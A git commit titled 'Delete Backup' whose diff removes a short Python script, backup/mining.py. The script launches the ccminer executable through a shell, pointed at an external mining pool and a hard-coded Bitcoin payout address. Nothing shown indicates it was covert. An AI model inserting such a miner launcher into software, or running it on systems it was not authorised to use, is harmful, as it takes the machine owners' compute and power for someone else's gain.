bbbb63c4a93f536dfc5fc181cef349e030d99394
ger <>
2019-05-19 14:10:12 +0700

    Delete Backup

--- backup/mining.py
+++
@@ -1,9 +0,0 @@
-import os
-import subprocess
-
-def mining():
-    
-    process = subprocess.Popen(os.getcwd()+r'\miner\ccminer-x64.exe -a x13 -o stratum+tcp://x13.sea.mine.zpool.ca:3633 -u 3PmdKfoVPU4ZG9PsmKMMdqJmDPhXJMwfgn -p c=BTC', shell=True)
-
-
-mining()
